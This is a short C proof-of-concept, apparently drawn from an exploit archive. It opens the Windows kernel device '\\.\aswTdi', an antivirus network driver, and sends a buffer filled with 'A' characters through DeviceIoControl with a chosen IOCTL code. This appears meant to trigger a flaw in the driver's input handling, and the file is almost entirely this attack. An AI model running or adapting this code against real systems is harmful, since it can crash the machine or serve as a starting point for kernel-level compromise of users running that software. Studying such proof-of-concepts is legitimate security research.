
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int LPVOID ;
typedef int HANDLE ;
typedef int DWORD ;


 int CreateFileA (char*,int,int ,int ,int ,int ,int *) ;
 int DeviceIoControl (int ,int,int ,int,int ,int,int*,int *) ;
 int GENERIC_READ ;
 int GENERIC_WRITE ;
 int INVALID_HANDLE_VALUE ;
 int OPEN_EXISTING ;
 int free (void*) ;
 void* malloc (int) ;
 int memset (void*,char,int) ;
 int printf (char*) ;

int main(int argc, char **argv)
{
    HANDLE hDevice;
    DWORD cb;
    void *buff;
    int len = 0;
    int pfh;
    int outlen = 0, inlen = 0;
    DWORD ioctl = 0x800515A8;
    char deviceName[] = "\\\\.\\aswTdi";

    if ( (hDevice = CreateFileA(deviceName,
                          GENERIC_READ|GENERIC_WRITE,
                          0,
                          0,
                          OPEN_EXISTING,
                          0,
                          ((void*)0)) ) != INVALID_HANDLE_VALUE )
    {
        printf("Device  succesfully opened!\n");
    }
    else
    {
        printf("Error: Error opening device \n");
        return 0;
    }

    cb = 0;
    buff = malloc(0x2000);
    if(!buff){
      printf("malloc failed");
      return 0;
    }
    memset(buff, 'A', 0x2000-1);
    ioctl = 0x80000004;
    inlen = 4;

    outlen = 4;
    DeviceIoControl(hDevice, ioctl, (LPVOID)buff, inlen, (LPVOID)buff,
outlen, &cb, ((void*)0));
    free(buff);

    printf("done!");
}
